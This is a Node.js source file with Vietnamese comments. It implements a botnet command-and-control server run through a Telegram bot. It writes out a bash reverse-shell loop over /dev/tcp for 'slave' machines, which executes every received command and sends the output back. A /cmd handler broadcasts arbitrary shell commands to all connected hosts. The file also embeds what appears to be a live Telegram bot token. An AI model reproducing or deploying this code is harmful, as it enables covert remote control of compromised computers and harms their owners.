const net = require('net');
const TelegramBot = require('node-telegram-bot-api');
const { execSync } = require('child_process');

// === Cấu hình ===
const TELEGRAM_BOT_TOKEN = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
const TELEGRAM_CHAT_ID = '7371969470';
const PORT = 7777;

// === Khởi tạo bot Telegram ===
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// === Danh sách các bot slave đang kết nối ===
let clients = [];

// === Hàm gửi kết quả về Telegram ===
function sendToTelegram(message) {
  bot.sendMessage(TELEGRAM_CHAT_ID, message);
}

// === Hàm tạo lệnh dành cho slave ===
function generateSlaveCommand(ip) {
  return `while true; do
  exec 3<>/dev/tcp/${ip}/${PORT}
  while read -r cmd <&3; do
    [[ -z "$cmd" ]] && continue
    output=$(bash -c "$cmd" 2>&1)
    echo "$output" >&3
  done
  sleep 2
done`;
}

// === Tạo server TCP ===
const server = net.createServer((socket) => {
  const address = `${socket.remoteAddress}:${socket.remotePort}`;
  clients.push({ socket, address });

  sendToTelegram(`🟢 Bot mới kết nối: ${address}`);

  socket.on('data', (data) => {
    const result = data.toString().trim();
    if (result) {
      sendToTelegram(`📥 Kết quả từ ${address}:\n${result}`);
    }
  });

  socket.on('close', () => {
    clients = clients.filter(c => c.socket !== socket);
    sendToTelegram(`🔴 Bot đã ngắt kết nối: ${address}`);
  });

  socket.on('error', () => {
    clients = clients.filter(c => c.socket !== socket);
    sendToTelegram(`🔴 Bot lỗi kết nối: ${address}`);
  });
});

server.listen(PORT, async () => {
  const ipv4 = execSync("curl -s https://api.ipify.org").toString().trim();
  console.log(`🔥 Server sẵn sàng trên cổng ${PORT}`);
  sendToTelegram(`🔥 Server sẵn sàng trên cổng ${PORT}\n\nCopy lệnh này chạy trên slave để kết nối:\n\`\`\`\n${generateSlaveCommand(ipv4)}\n\`\`\``);
});

// === Xử lý lệnh từ Telegram ===
bot.onText(/^\/listbot$/, () => {
  if (clients.length === 0) {
    return sendToTelegram('📛 Không có bot nào đang kết nối.');
  }
  const list = clients.map((c, i) => `Bot ${i + 1} [${c.address}]`).join('\n');
  sendToTelegram(`📋 Danh sách ${clients.length} bot đang kết nối:\n${list}`);
});

bot.onText(/^\/cmd (.+)/, (_, match) => {
  const cmd = match[1];
  if (clients.length === 0) {
    return sendToTelegram('📛 Không có bot nào đang kết nối để gửi lệnh.');
  }
  sendToTelegram(`📤 Gửi lệnh: \`${cmd}\` đến ${clients.length} bot...`);
  clients.forEach(c => {
    try {
      c.socket.write(cmd + '\n');
    } catch (e) {}
  });
});
